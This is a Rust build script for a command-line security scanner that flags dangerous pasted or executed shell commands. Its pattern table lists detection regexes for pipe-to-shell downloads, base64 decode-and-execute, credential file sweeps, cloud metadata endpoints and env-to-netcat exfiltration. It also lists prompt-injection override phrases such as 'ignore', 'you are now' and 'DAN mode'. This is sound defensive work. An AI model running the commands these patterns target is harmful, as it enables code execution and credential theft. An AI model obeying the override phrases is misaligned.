use serde::Deserialize;
use std::env;
use std::fs;
use std::path::Path;

/// Escape a string for embedding in a Rust string literal.
fn esc_rust_str(s: &str) -> String {
    s.replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', "\\n")
        .replace('\r', "\\r")
        .replace('\t', "\\t")
}

#[derive(Deserialize)]
struct CredentialPatternsFile {
    pattern: Option<Vec<CredPattern>>,
    private_key_pattern: Option<Vec<PrivKeyPattern>>,
}

#[derive(Deserialize)]
struct CredPattern {
    tier1_fragment: String,
    #[allow(dead_code)]
    id: String,
    #[allow(dead_code)]
    name: String,
    #[allow(dead_code)]
    regex: String,
    #[allow(dead_code)]
    redact_prefix_len: Option<usize>,
    #[allow(dead_code)]
    severity: String,
}

#[derive(Deserialize)]
struct PrivKeyPattern {
    tier1_fragment: String,
    #[allow(dead_code)]
    id: String,
    #[allow(dead_code)]
    name: String,
    #[allow(dead_code)]
    regex: String,
    #[allow(dead_code)]
    severity: String,
}

fn main() {
    let out_dir = env::var("OUT_DIR").unwrap();
    let manifest_dir = env::var("CARGO_MANIFEST_DIR").unwrap();
    // Data files live under the crate dir so they ship in the crate tarball.
    let data_dir = Path::new(&manifest_dir).join("assets").join("data");

    compile_confusables(&data_dir, &out_dir);
    compile_text_confusables(&data_dir, &out_dir);
    compile_known_domains(&data_dir, &out_dir);
    compile_popular_repos(&data_dir, &out_dir);
    compile_public_suffix_list(&data_dir, &out_dir);
    compile_ocr_confusions(&data_dir, &out_dir);
    generate_tier1_regex(&out_dir);
    compile_rule_explanations(&data_dir, &out_dir);

    println!("cargo:rerun-if-changed=assets/data/confusables.txt");
    println!("cargo:rerun-if-changed=assets/data/text_confusables.txt");
    println!("cargo:rerun-if-changed=assets/data/known_domains.csv");
    println!("cargo:rerun-if-changed=assets/data/popular_repos.csv");
    println!("cargo:rerun-if-changed=assets/data/public_suffix_list.dat");
    println!("cargo:rerun-if-changed=assets/data/ocr_confusions.tsv");
    println!("cargo:rerun-if-changed=assets/data/credential_patterns.toml");
    println!("cargo:rerun-if-changed=assets/data/rule_explanations.toml");
    println!("cargo:rerun-if-changed=build.rs");
}

fn compile_confusables(data_dir: &Path, out_dir: &str) {
    compile_confusable_file(
        data_dir,
        out_dir,
        "confusables.txt",
        "CONFUSABLE_TABLE",
        "CONFUSABLE_COUNT",
        "/// Auto-generated confusable character table.\n",
        "confusables_gen.rs",
    );
}

fn compile_text_confusables(data_dir: &Path, out_dir: &str) {
    compile_confusable_file(
        data_dir,
        out_dir,
        "text_confusables.txt",
        "TEXT_CONFUSABLE_TABLE",
        "TEXT_CONFUSABLE_COUNT",
        "/// Auto-generated text-level confusable character table.\n\
         /// Separate from hostname confusables — used by ConfusableText rule.\n",
        "text_confusables_gen.rs",
    );
}

/// Shared parser for confusable mapping files (format: `hex hex # comment`).
fn compile_confusable_file(
    data_dir: &Path,
    out_dir: &str,
    filename: &str,
    table_name: &str,
    count_name: &str,
    doc_comment: &str,
    out_filename: &str,
) {
    let path = data_dir.join(filename);
    let content =
        fs::read_to_string(&path).unwrap_or_else(|e| panic!("Failed to read {filename}: {e}"));

    let mut entries = Vec::new();
    for line in content.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let parts: Vec<&str> = line
            .split('#')
            .next()
            .unwrap_or("")
            .split_whitespace()
            .collect();
        if parts.len() >= 2 {
            if let (Ok(src), Ok(tgt)) = (
                u32::from_str_radix(parts[0], 16),
                u32::from_str_radix(parts[1], 16),
            ) {
                entries.push((src, tgt));
            }
        }
    }

    let mut code = String::new();
    code.push_str(doc_comment);
    code.push_str(&format!("pub const {table_name}: &[(u32, u32)] = &[\n"));
    for (src, tgt) in &entries {
        code.push_str(&format!("    (0x{src:04X}, 0x{tgt:04X}),\n"));
    }
    code.push_str("];\n");
    let count = entries.len();
    code.push_str(&format!("\npub const {count_name}: usize = {count};\n"));

    let out_path = Path::new(out_dir).join(out_filename);
    fs::write(&out_path, code).unwrap();
}

fn compile_known_domains(data_dir: &Path, out_dir: &str) {
    let path = data_dir.join("known_domains.csv");
    let content = fs::read_to_string(&path)
        .unwrap_or_else(|e| panic!("Failed to read known_domains.csv: {e}"));

    let mut domains = Vec::new();
    for line in content.lines().skip(1) {
        let line = line.trim();
        if line.is_empty() {
            continue;
        }
        if let Some(domain) = line.split(',').next() {
            domains.push(domain.to_string());
        }
    }

    let mut code = String::new();
    code.push_str("/// Auto-generated known domains list.\n");
    code.push_str("pub const KNOWN_DOMAINS: &[&str] = &[\n");
    for domain in &domains {
        code.push_str(&format!("    \"{domain}\",\n"));
    }
    code.push_str("];\n");
    let count = domains.len();
    code.push_str(&format!(
        "\npub const KNOWN_DOMAIN_COUNT: usize = {count};\n"
    ));

    let out_path = Path::new(out_dir).join("known_domains_gen.rs");
    fs::write(&out_path, code).unwrap();
}

fn compile_popular_repos(data_dir: &Path, out_dir: &str) {
    let path = data_dir.join("popular_repos.csv");
    let content = fs::read_to_string(&path)
        .unwrap_or_else(|e| panic!("Failed to read popular_repos.csv: {e}"));

    let mut repos = Vec::new();
    for line in content.lines().skip(1) {
        let line = line.trim();
        if line.is_empty() {
            continue;
        }
        let parts: Vec<&str> = line.split(',').collect();
        if parts.len() >= 2 {
            repos.push((parts[0].to_string(), parts[1].to_string()));
        }
    }

    let mut code = String::new();
    code.push_str("/// Auto-generated popular repos list.\n");
    code.push_str("pub const POPULAR_REPOS: &[(&str, &str)] = &[\n");
    for (owner, name) in &repos {
        code.push_str(&format!("    (\"{owner}\", \"{name}\"),\n"));
    }
    code.push_str("];\n");

    let out_path = Path::new(out_dir).join("popular_repos_gen.rs");
    fs::write(&out_path, code).unwrap();
}

fn compile_public_suffix_list(data_dir: &Path, out_dir: &str) {
    let path = data_dir.join("public_suffix_list.dat");
    let content = fs::read_to_string(&path)
        .unwrap_or_else(|e| panic!("Failed to read public_suffix_list.dat: {e}"));

    let mut suffixes = Vec::new();
    for line in content.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with("//") {
            continue;
        }
        suffixes.push(line.to_string());
    }

    let mut code = String::new();
    code.push_str("/// Auto-generated public suffix list.\n");
    code.push_str("pub const PUBLIC_SUFFIXES: &[&str] = &[\n");
    for suffix in &suffixes {
        code.push_str(&format!("    \"{suffix}\",\n"));
    }
    code.push_str("];\n");
    let count = suffixes.len();
    code.push_str(&format!(
        "\npub const PUBLIC_SUFFIX_COUNT: usize = {count};\n"
    ));

    let out_path = Path::new(out_dir).join("psl_gen.rs");
    fs::write(&out_path, code).unwrap();
}

fn compile_ocr_confusions(data_dir: &Path, out_dir: &str) {
    let path = data_dir.join("ocr_confusions.tsv");
    let content = fs::read_to_string(&path)
        .unwrap_or_else(|e| panic!("Failed to read ocr_confusions.tsv: {e}"));

    let mut entries: Vec<(String, String)> = Vec::new();
    for (line_num, line) in content.lines().enumerate() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let parts: Vec<&str> = line.splitn(2, '\t').collect();
        if parts.len() != 2 {
            panic!(
                "ocr_confusions.tsv:{}: expected 2 TAB-separated columns, got {}",
                line_num + 1,
                parts.len()
            );
        }
        let canonical = parts[1];
        // Canonicals must be lowercase — the comparison pipeline lowercases input,
        // so an uppercase canonical would be dead code.
        if canonical.chars().any(|c| c.is_ascii_uppercase()) {
            panic!(
                "ocr_confusions.tsv:{}: canonical value {:?} contains uppercase — \
                 all alphabetic canonicals must be lowercase (comparison pipeline lowercases input)",
                line_num + 1,
                canonical
            );
        }
        entries.push((parts[0].to_string(), canonical.to_string()));
    }

    // Sort by confusable length descending (multi-char first, for longest-match).
    entries.sort_by_key(|e| std::cmp::Reverse(e.0.len()));

    let mut code = String::new();
    code.push_str("/// Auto-generated OCR confusion table.\n");
    code.push_str(
        "/// Sorted by confusable length descending for longest-match-first normalization.\n",
    );
    code.push_str("pub const OCR_CONFUSIONS: &[(&str, &str)] = &[\n");
    for (confusable, canonical) in &entries {
        code.push_str(&format!(
            "    (\"{}\", \"{}\"),\n",
            esc_rust_str(confusable),
            esc_rust_str(canonical)
        ));
    }
    code.push_str("];\n");
    let count = entries.len();
    code.push_str(&format!(
        "\npub const OCR_CONFUSION_COUNT: usize = {count};\n"
    ));

    let out_path = Path::new(out_dir).join("ocr_confusions_gen.rs");
    fs::write(&out_path, code).unwrap();
}

/// Declarative pattern table for Tier 1 / Tier 3 extraction. build.rs assembles
/// the exec-time and paste-time regexes from these fragments at compile time.
///
/// INVARIANT: any Tier 3 extraction path MUST have a corresponding Tier 1
/// fragment here — a missing fragment lets the extractor silently miss input (a
/// security bug).
struct PatternEntry {
    id: &'static str,
    tier1_exec_fragments: &'static [&'static str],
    tier1_paste_only_fragments: &'static [&'static str],
    #[allow(dead_code)]
    notes: &'static str,
}

const PATTERN_TABLE: &[PatternEntry] = &[
    PatternEntry {
        id: "standard_url",
        tier1_exec_fragments: &[r"://"],
        tier1_paste_only_fragments: &[],
        notes: "Standard URLs with scheme (http://, https://, ftp://, etc.)",
    },
    PatternEntry {
        id: "scp_style_git",
        tier1_exec_fragments: &[r"git@"],
        tier1_paste_only_fragments: &[],
        notes: "SCP-style git URLs (git@github.com:user/repo)",
    },
    PatternEntry {
        id: "punycode_domain",
        tier1_exec_fragments: &[r"xn--"],
        tier1_paste_only_fragments: &[],
        notes: "Punycode-encoded internationalized domain names",
    },
    PatternEntry {
        id: "docker_command",
        tier1_exec_fragments: &[r"(?:docker|podman)\s+(pull|run|build|create|compose|image)"],
        tier1_paste_only_fragments: &[],
        notes: "Docker/Podman commands that reference images",
    },
    PatternEntry {
        id: "pipe_to_interpreter",
        tier1_exec_fragments: &[
            r"(?i)\|[&\s]*(?:\S*(?:sudo|env|command|exec|nohup)\S*\s+|/\S*/?)*(?:\S+\s+)*\S*(?:sh|bash|zsh|dash|ksh|fish|csh|tcsh|ash|mksh|python[23]?|node|deno|bun|perl|ruby|php|lua|tclsh|elixir|rscript|pwsh|iex|invoke-expression|cmd)",
        ],
        tier1_paste_only_fragments: &[],
        notes: "Pipe output to an interpreter (| bash, | sudo bash, | iex, etc.)",
    },
    PatternEntry {
        id: "powershell_iwr",
        tier1_exec_fragments: &[r"(?i:iwr)\s"],
        tier1_paste_only_fragments: &[],
        notes: "PowerShell Invoke-WebRequest shorthand",
    },
    PatternEntry {
        id: "powershell_irm",
        tier1_exec_fragments: &[r"(?i:irm)\s"],
        tier1_paste_only_fragments: &[],
        notes: "PowerShell Invoke-RestMethod shorthand",
    },
    PatternEntry {
        id: "powershell_invoke_webrequest",
        tier1_exec_fragments: &[r"(?i:Invoke-WebRequest)"],
        tier1_paste_only_fragments: &[],
        notes: "PowerShell Invoke-WebRequest full name",
    },
    PatternEntry {
        id: "powershell_invoke_restmethod",
        tier1_exec_fragments: &[r"(?i:Invoke-RestMethod)"],
        tier1_paste_only_fragments: &[],
        notes: "PowerShell Invoke-RestMethod full name",
    },
    PatternEntry {
        id: "powershell_invoke_expression",
        tier1_exec_fragments: &[r"(?i:Invoke-Expression)"],
        tier1_paste_only_fragments: &[],
        notes: "PowerShell Invoke-Expression (iex) full name",
    },
    PatternEntry {
        id: "ps_set_execution_policy",
        tier1_exec_fragments: &[
            r"(?i:Set-ExecutionPolicy)\b",
            // PR #121 item 12: `-ex` is the shortest unambiguous prefix of
            // `-ExecutionPolicy`; without it, `powershell -ex Bypass …` fast-exits
            // at tier-1 before reaching the tier-3 rule.
            r"-(?i:ExecutionPolicy|ep|ex)\b",
        ],
        tier1_paste_only_fragments: &[],
        notes: "PowerShell Set-ExecutionPolicy Bypass — cmdlet form and powershell.exe -ExecutionPolicy / -ep / -ex flag form",
    },
    PatternEntry {
        id: "ps_defender_exclusion",
        tier1_exec_fragments: &[r"(?i:Add-MpPreference)\b"],
        tier1_paste_only_fragments: &[],
        notes: "PowerShell Add-MpPreference -ExclusionPath/-ExclusionProcess/-ExclusionExtension — Defender exclusion",
    },
    PatternEntry {
        id: "ps_iex_inline",
        // `[\s(]` accepts both `iex (iwr …)` and `iex(iwr …)` while requiring a
        // real command boundary (`\b` would also match `iex2 …`).
        tier1_exec_fragments: &[r"(?i:iex)[\s(]"],
        tier1_paste_only_fragments: &[],
        notes: "PowerShell iex as leading command (inline download-execute form)",
    },
    PatternEntry {
        id: "curl",
        tier1_exec_fragments: &[r"curl\s"],
        tier1_paste_only_fragments: &[],
        notes: "curl download command",
    },
    PatternEntry {
        id: "wget",
        tier1_exec_fragments: &[r"wget\s"],
        tier1_paste_only_fragments: &[],
        notes: "wget download command",
    },
    PatternEntry {
        id: "httpie",
        tier1_exec_fragments: &[r"(?:^|\s)https?\s"],
        tier1_paste_only_fragments: &[],
        notes: "HTTPie CLI download command (http/https)",
    },
    PatternEntry {
        id: "xh",
        tier1_exec_fragments: &[r"(?:^|\s)xh\s"],
        tier1_paste_only_fragments: &[],
        notes: "xh CLI download command (HTTPie-compatible)",
    },
    PatternEntry {
        id: "ssh_connect",
        tier1_exec_fragments: &[r"(?:^|\s)ssh\s"],
        tier1_paste_only_fragments: &[],
        notes: "SSH connection — trigger threat DB IP lookup",
    },
    PatternEntry {
        id: "scp",
        tier1_exec_fragments: &[r"scp\s"],
        tier1_paste_only_fragments: &[],
        notes: "scp file transfer",
    },
    PatternEntry {
        id: "rsync",
        tier1_exec_fragments: &[r"rsync\s"],
        tier1_paste_only_fragments: &[],
        notes: "rsync file sync",
    },
    PatternEntry {
        id: "lookalike_tld",
        tier1_exec_fragments: &[r"\.\s*(zip|mov|app|dev|run)\b"],
        tier1_paste_only_fragments: &[],
        notes: "TLDs that look like file extensions",
    },
    PatternEntry {
        id: "url_shortener",
        tier1_exec_fragments: &[r"bit\.ly|t\.co|tinyurl|is\.gd|v\.gd"],
        tier1_paste_only_fragments: &[],
        notes: "URL shortener domains",
    },
    PatternEntry {
        id: "dotfile_overwrite",
        tier1_exec_fragments: &[r">\s*~/\.", r">\s*\$HOME/\."],
        tier1_paste_only_fragments: &[],
        notes: "Redirect output to dotfiles in home directory (> ~/.bashrc, >> $HOME/.profile)",
    },
    PatternEntry {
        id: "git_sink",
        tier1_exec_fragments: &[r"git\s+(?:clone|fetch|pull|submodule|remote)\s"],
        tier1_paste_only_fragments: &[],
        notes: "Git download subcommands that may reference schemeless URLs",
    },
    PatternEntry {
        id: "archive_extract_sensitive",
        tier1_exec_fragments: &[r"(?:tar|unzip|7z)\s"],
        tier1_paste_only_fragments: &[],
        notes: "Archive extraction commands that may target sensitive paths",
    },
    PatternEntry {
        id: "base64_decode_execute",
        tier1_exec_fragments: &[
            r"base64\s",
            r"b64decode",
            r"atob\s*\(",
            r"(?i)-(?:EncodedCommand|enc|ec)\b",
            r"(?i)Buffer\.from\(",
        ],
        tier1_paste_only_fragments: &[],
        notes: "Base64 decode-and-execute patterns (pipe chain, inline, PowerShell)",
    },
    PatternEntry {
        id: "cargo_vet",
        tier1_exec_fragments: &[r"\bcargo\b"],
        tier1_paste_only_fragments: &[],
        notes: "Cargo install/add without supply-chain audit",
    },
    PatternEntry {
        id: "package_install",
        tier1_exec_fragments: &[
            r"(?:pip3?|uv)\s+install\b",
            r"(?:npm|npx|yarn|pnpm|bun)\s+(?:install|i|add)\b",
            r"npx\s",
            r"gem\s+install\b",
            r"go\s+(?:get|install)\b",
            r"composer\s+require\b",
            r"dotnet\s+add\b",
        ],
        tier1_paste_only_fragments: &[],
        notes: "Package manager install commands — trigger threat DB lookup",
    },
    PatternEntry {
        id: "install_command",
        tier1_exec_fragments: &[
            // Tier-1 gate only; the install-command rules tokenize subcommands/flags.
            r"\b(?:apt|apt-get|aptitude)\s+(?:install|update|upgrade|add-repository)\b",
            r"\bdnf\s+(?:install|upgrade|update)\b",
            r"\b(?:yum|zypper)\s+install\b",
            r"\bpacman\s+-[A-Za-z]*S",
            r"\b(?:yay|paru|trizen)\s",
            r"\bbrew\s+(?:install|tap|reinstall)\b",
            r"\bkubectl\s+(?:apply|create|replace)\b",
            r"\bhelm\s+(?:install|upgrade|repo)\b",
            r"\bterraform\s+(?:init|get)\b",
            // High-risk markers that can appear without the tool name on the line.
            r"sources\.list",
            r"add-apt-repository\b",
            r"\[trusted=yes\]",
            r"--allow-unauthenticated\b",
            r"--allow-insecure-repositories\b",
            r"--nogpgcheck\b",
            r"(?i)gpgcheck\s*=\s*0",
            r"(?i)SigLevel\s*=\s*Never",
        ],
        tier1_paste_only_fragments: &[],
        notes: "Package-manager / infrastructure install commands and their \
                high-risk markers (unsigned repos, disabled GPG checks, remote manifests)",
    },
    PatternEntry {
        id: "env_var_dangerous",
        tier1_exec_fragments: &[
            r"LD_PRELOAD",
            r"LD_LIBRARY_PATH",
            r"LD_AUDIT",
            r"DYLD_INSERT_LIBRARIES",
            r"DYLD_LIBRARY_PATH",
            r"BASH_ENV\s*=",
            r"\bENV\s*=",
            r"PROMPT_COMMAND\s*=",
        ],
        tier1_paste_only_fragments: &[],
        notes: "Code injection and shell injection environment variable names",
    },
    PatternEntry {
        id: "env_var_hijack",
        tier1_exec_fragments: &[r"(?:PYTHONPATH|NODE_OPTIONS|RUBYLIB|PERL5LIB)\s*="],
        tier1_paste_only_fragments: &[],
        notes: "Interpreter hijacking environment variable names",
    },
    PatternEntry {
        id: "env_var_sensitive",
        tier1_exec_fragments: &[
            r"(?:AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|OPENAI_API_KEY|ANTHROPIC_API_KEY|GITHUB_TOKEN)\s*=",
        ],
        tier1_paste_only_fragments: &[],
        notes: "Sensitive API key environment variable exports",
    },
    PatternEntry {
        id: "metadata_endpoint",
        tier1_exec_fragments: &[r"169\.254\.169\.254", r"100\.100\.100\.200"],
        tier1_paste_only_fragments: &[],
        notes: "Cloud metadata endpoint IP addresses (AWS, Alibaba Cloud)",
    },
    PatternEntry {
        id: "private_network_ip",
        tier1_exec_fragments: &[
            r"\b10\.\d+\.\d+\.\d+",
            r"\b172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+",
            r"\b192\.168\.\d+\.\d+",
            r"\b127\.\d+\.\d+\.\d+",
        ],
        tier1_paste_only_fragments: &[],
        notes: "Private/reserved IPv4 address ranges for SSRF/lateral-movement detection",
    },
    PatternEntry {
        id: "proc_mem_access",
        tier1_exec_fragments: &[r"/proc/\S*/mem"],
        tier1_paste_only_fragments: &[],
        notes: "Direct /proc/*/mem access for process memory scraping",
    },
    PatternEntry {
        id: "docker_remote_privesc",
        tier1_exec_fragments: &[
            r"docker\s.*tcp://",
            r"podman\s.*tcp://",
            r"DOCKER_HOST=['\x22]?tcp://",
        ],
        tier1_paste_only_fragments: &[],
        notes: "Docker/Podman remote daemon with privilege escalation",
    },
    PatternEntry {
        id: "credential_file_sweep",
        tier1_exec_fragments: &[
            r"\.ssh/id_",
            r"\.ssh/authorized_keys",
            r"\.aws/credentials",
            r"\.aws/config",
            r"\.docker/config\.json",
            r"\.kube/config",
            r"\.config/gcloud/",
            r"\.npmrc",
            r"\.pypirc",
            r"\.netrc",
            r"\.gnupg/",
            r"\.config/gh/",
            r"\.git-credentials",
        ],
        tier1_paste_only_fragments: &[],
        notes: "Credential file path sweep (multiple sensitive paths in one command)",
    },
    PatternEntry {
        id: "non_ascii_paste",
        tier1_exec_fragments: &[],
        tier1_paste_only_fragments: &[r"[^\x00-\x7F]"],
        notes:
            "Non-ASCII bytes in pasted content (analysis trigger only, never sole reason to WARN)",
    },
    PatternEntry {
        id: "cloud_cli",
        // M8 ch1 — coarse tier-1 probe for cloud/k8s CLIs; the precise
        // destructive-verb match lives in `rules::context::check`. `aws-vault` is
        // listed because `aws-vault exec … -- aws s3 rm …` is the same shape with a
        // credential wrapper. `\b` keeps `aws-` / `azimuth` out of the hit list.
        tier1_exec_fragments: &[
            r"\b(?:kubectl|kustomize|helm|argocd|aws|aws-vault|gcloud|az)\b",
        ],
        tier1_paste_only_fragments: &[],
        notes: "Cloud / k8s CLIs for production-context destructive-command detection (M8 ch1)",
    },
    PatternEntry {
        id: "ssh_cmd",
        // M8 ch2 — coarse tier-1 probe for `ssh`; the precise destructive-verb +
        // host-label match lives in `rules::ssh_context::check`. `\b` keeps `sshd`,
        // `sshpass`, `_ssh` out — only the standalone `ssh` token matches.
        tier1_exec_fragments: &[r"\bssh\b"],
        tier1_paste_only_fragments: &[],
        notes: "SSH invocations for remote-session destructive-command detection (M8 ch2)",
    },
    PatternEntry {
        id: "iac_cmd",
        // M8 ch3 — coarse tier-1 probe for IaC CLIs; precise apply/destroy/
        // -auto-approve matching lives in `rules::iac::check`. `\b` keeps
        // `terraformer`, `pulumictl`, `tofu-config` out of the hit list.
        tier1_exec_fragments: &[r"\b(?:terraform|pulumi|tofu)\b"],
        tier1_paste_only_fragments: &[],
        notes: "IaC CLIs for apply-gate / destroy detection (M8 ch3)",
    },
    PatternEntry {
        id: "docker_exec",
        // M8 ch5 — the `docker_command` entry does not match `exec`, so the
        // prod-container exec rule needs its own tier-1 admission ticket. (The
        // privileged-run / bind-mount rules ride on `docker_command`.)
        tier1_exec_fragments: &[r"(?:docker|podman)\s+exec"],
        tier1_paste_only_fragments: &[],
        notes: "Docker / Podman exec subcommand for prod-container detection (M8 ch5)",
    },
    PatternEntry {
        id: "sudo_cmd",
        // M8 ch4 — coarse tier-1 probe for `sudo`; the precise matching lives in
        // `rules::sudo::check`. `\b` keeps `sudoers` / `pseudo-` out. Catches
        // direct `sudo …` invocations the pipe-to-interpreter regex misses (e.g.
        // `sudo sh`, `sudo tee /etc/foo`).
        tier1_exec_fragments: &[r"\bsudo\b"],
        tier1_paste_only_fragments: &[],
        notes: "Sudo invocations for escalation-gate detection (M8 ch4)",
    },
    PatternEntry {
        id: "env_to_network_sink",
        // M9 ch4 — tier-1 ticket for the no-URL `env | nc attacker 4444` shape
        // (`env | curl https://x` already passes via `standard_url`). The precise
        // check lives in `env_guard::check_printenv_to_network_sink`; `\b` keeps
        // `printenvironment` / `environment` out.
        tier1_exec_fragments: &[r"\b(?:printenv|env)\b\s*\|"],
        tier1_paste_only_fragments: &[],
        notes: "printenv/env piped to a network sink (M9 ch4)",
    },
    PatternEntry {
        id: "destructive_fs_op",
        // M10 ch1 — coarse tier-1 probe for destructive fs ops; the precise match
        // lives in the cheap, filesystem-free `blast_radius::cheap_check` (hot
        // path). The full filesystem-walking `blast_radius::simulate` runs ONLY
        // under `tirith preview`, never the hot path (see `engine::analyze`). `\b`
        // keeps `charm`/`firmware` out; the cheap check re-verifies the leader, so
        // a coarse hit on `mv` in prose is harmless.
        tier1_exec_fragments: &[r"\b(?:rm|mv|chmod|find|rsync)\b"],
        tier1_paste_only_fragments: &[],
        notes: "Destructive filesystem ops for blast-radius cheap check (M10 ch1)",
    },
    PatternEntry {
        id: "prompt_injection_seed",
        // M7 ch5 — coarse paste-only gate for the prompt-injection rule; the
        // precise regex lives in `rules::prompt_injection`. Kept `paste_only` (not
        // `exec`) so the exec hot path isn't tripped by `git ignore-revs` or
        // `# disregard this commit`. FileScan and the output pipeline reach the
        // rule independently of this row; it stays explicit for the safeguard test.
        tier1_exec_fragments: &[],
        tier1_paste_only_fragments: &[
            r"(?i)\bignore\b",
            r"(?i)\bdisregard\b",
            r"(?i)\bforget\b",
            r"(?i)\boverride\b",
            r"(?i)\bact\s+as\b",
            r"(?i)\byou\s+are\s+now\b",
            r"(?i)\bsystem\s*:",
            r"(?i)\bDAN\s+mode\b",
            r"(?i)\bdo\s+anything\s+now\b",
            r"(?i)\bnew\s+instructions\s*:",
            r"(?i)\bfrom\s+now\s+on\b",
        ],
        notes: "Prompt-injection seed phrases — coarse tier-1 gate for the paste context. \
                The precise multi-word regex lives in `rules::prompt_injection`.",
    },
    PatternEntry {
        id: "command_card_shell_comment",
        // M11 ch1 — tier-1 ticket for the shell-comment card-reference channel
        // (`# tirith-card: ./install-card.json` preceding a command); the precise
        // parse + local-vs-URL classification is in `command_card::find_card_comment`.
        // The `--card <path>` sidecar is a SEPARATE channel (via `ctx.card_ref`).
        // v1 has no HTML-comment channel; a URL-shaped value is not fetched on the
        // hot path (it warns "fetch first").
        tier1_exec_fragments: &[r"#\s*tirith-card:"],
        tier1_paste_only_fragments: &[],
        notes: "Command-card shell-comment reference channel (M11 ch1) — \
                `# tirith-card: <local-path>` preceding a command.",
    },
];

fn generate_tier1_regex(out_dir: &str) {
    let mut exec_fragments: Vec<String> = Vec::new();
    let mut paste_fragments: Vec<String> = Vec::new();
    let mut ids: Vec<String> = Vec::new();

    for entry in PATTERN_TABLE {
        ids.push(entry.id.to_string());

        for frag in entry.tier1_exec_fragments {
            exec_fragments.push(frag.to_string());
            paste_fragments.push(frag.to_string());
        }
        for frag in entry.tier1_paste_only_fragments {
            paste_fragments.push(frag.to_string());
        }

        if entry.tier1_exec_fragments.is_empty() && entry.tier1_paste_only_fragments.is_empty() {
            let id = entry.id;
            panic!(
                "COMPILE ERROR: Pattern table entry '{id}' has no Tier 1 fragments! \
                 Every extractor must have a Tier 1 trigger to maintain the superset invariant.",
            );
        }
    }

    let manifest_dir = env::var("CARGO_MANIFEST_DIR").unwrap();
    let cred_path = Path::new(&manifest_dir)
        .join("assets")
        .join("data")
        .join("credential_patterns.toml");
    let cred_content = fs::read_to_string(&cred_path)
        .unwrap_or_else(|e| panic!("Failed to read credential_patterns.toml: {e}"));
    let cred_file: CredentialPatternsFile = toml::from_str(&cred_content)
        .unwrap_or_else(|e| panic!("Failed to parse credential_patterns.toml: {e}"));

    {
        let mut known_frags: Vec<String> = Vec::new();
        if let Some(ref patterns) = cred_file.pattern {
            for p in patterns {
                known_frags.push(p.tier1_fragment.clone());
            }
        }
        assert!(
            !known_frags.is_empty(),
            "credential_patterns.toml has no [[pattern]] entries"
        );
        ids.push("credential_known".to_string());
        for frag in &known_frags {
            exec_fragments.push(frag.clone());
            paste_fragments.push(frag.clone());
        }
    }

    {
        let pk_patterns = cred_file
            .private_key_pattern
            .as_ref()
            .expect("credential_patterns.toml has no [[private_key_pattern]]");
        assert!(
            !pk_patterns.is_empty(),
            "credential_patterns.toml [[private_key_pattern]] is empty"
        );
        ids.push("credential_private_key".to_string());
        for pk in pk_patterns {
            exec_fragments.push(pk.tier1_fragment.clone());
            paste_fragments.push(pk.tier1_fragment.clone());
        }
    }

    {
        // Tier-1 must be a superset of GENERIC_SECRET_RE. `.{0,2}` is a permissive
        // stand-in for the runtime regex's optional quote/bracket before the
        // operator (a literal `"` can't appear in the generated `r"..."`).
        let generic_frag = r"(?i:key|token|secret|password)\w*.{0,2}\s*(?:[:=]|:=|=>|<-|>)";
        ids.push("credential_generic".to_string());
        paste_fragments.push(generic_frag.to_string());
    }

    let exec_regex = format!("(?:{})", exec_fragments.join("|"));
    let paste_regex = format!("(?:{})", paste_fragments.join("|"));

    let mut code = String::new();
    code.push_str("// Auto-generated Tier 1 regex patterns from declarative pattern table.\n");
    code.push_str("// DO NOT EDIT — modify the PATTERN_TABLE in build.rs instead.\n\n");
    code.push_str(&format!(
        "pub const TIER1_EXEC_PATTERN: &str = r\"{exec_regex}\";\n",
    ));
    code.push_str(&format!(
        "pub const TIER1_PASTE_PATTERN: &str = r\"{paste_regex}\";\n",
    ));
    let exec_count = exec_fragments.len();
    let paste_count = paste_fragments.len();
    code.push_str(&format!(
        "pub const TIER1_EXEC_FRAGMENT_COUNT: usize = {exec_count};\n",
    ));
    code.push_str(&format!(
        "pub const TIER1_PASTE_FRAGMENT_COUNT: usize = {paste_count};\n",
    ));

    code.push_str("\npub const EXTRACTOR_IDS: &[&str] = &[\n");
    for id in &ids {
        code.push_str(&format!("    \"{id}\",\n"));
    }
    code.push_str("];\n");

    let out_path = Path::new(out_dir).join("tier1_gen.rs");
    fs::write(&out_path, code).unwrap();
}

/// (snake_case id, PascalCase variant) for every RuleId — snake for TOML
/// validation, Pascal for the mitre_id match. Must match `enum RuleId` in
/// src/verdict.rs exactly; `test_all_rule_ids_have_explanation` catches drift.
const EXPECTED_RULES: &[(&str, &str)] = &[
    // Hostname
    ("non_ascii_hostname", "NonAsciiHostname"),
    ("punycode_domain", "PunycodeDomain"),
    ("mixed_script_in_label", "MixedScriptInLabel"),
    ("userinfo_trick", "UserinfoTrick"),
    ("confusable_domain", "ConfusableDomain"),
    ("raw_ip_url", "RawIpUrl"),
    ("non_standard_port", "NonStandardPort"),
    ("invalid_host_chars", "InvalidHostChars"),
    ("trailing_dot_whitespace", "TrailingDotWhitespace"),
    ("lookalike_tld", "LookalikeTld"),
    // Path
    ("non_ascii_path", "NonAsciiPath"),
    ("homoglyph_in_path", "HomoglyphInPath"),
    ("double_encoding", "DoubleEncoding"),
    // Transport
    ("plain_http_to_sink", "PlainHttpToSink"),
    ("schemeless_to_sink", "SchemelessToSink"),
    ("insecure_tls_flags", "InsecureTlsFlags"),
    ("shortened_url", "ShortenedUrl"),
    // Terminal deception
    ("ansi_escapes", "AnsiEscapes"),
    ("control_chars", "ControlChars"),
    ("bidi_controls", "BidiControls"),
    ("zero_width_chars", "ZeroWidthChars"),
    ("hidden_multiline", "HiddenMultiline"),
    ("unicode_tags", "UnicodeTags"),
    ("invisible_math_operator", "InvisibleMathOperator"),
    ("variation_selector", "VariationSelector"),
    ("invisible_whitespace", "InvisibleWhitespace"),
    ("hangul_filler", "HangulFiller"),
    ("confusable_text", "ConfusableText"),
    // Command shape
    ("pipe_to_interpreter", "PipeToInterpreter"),
    ("curl_pipe_shell", "CurlPipeShell"),
    ("wget_pipe_shell", "WgetPipeShell"),
    ("httpie_pipe_shell", "HttpiePipeShell"),
    ("xh_pipe_shell", "XhPipeShell"),
    ("dotfile_overwrite", "DotfileOverwrite"),
    ("archive_extract", "ArchiveExtract"),
    ("proc_mem_access", "ProcMemAccess"),
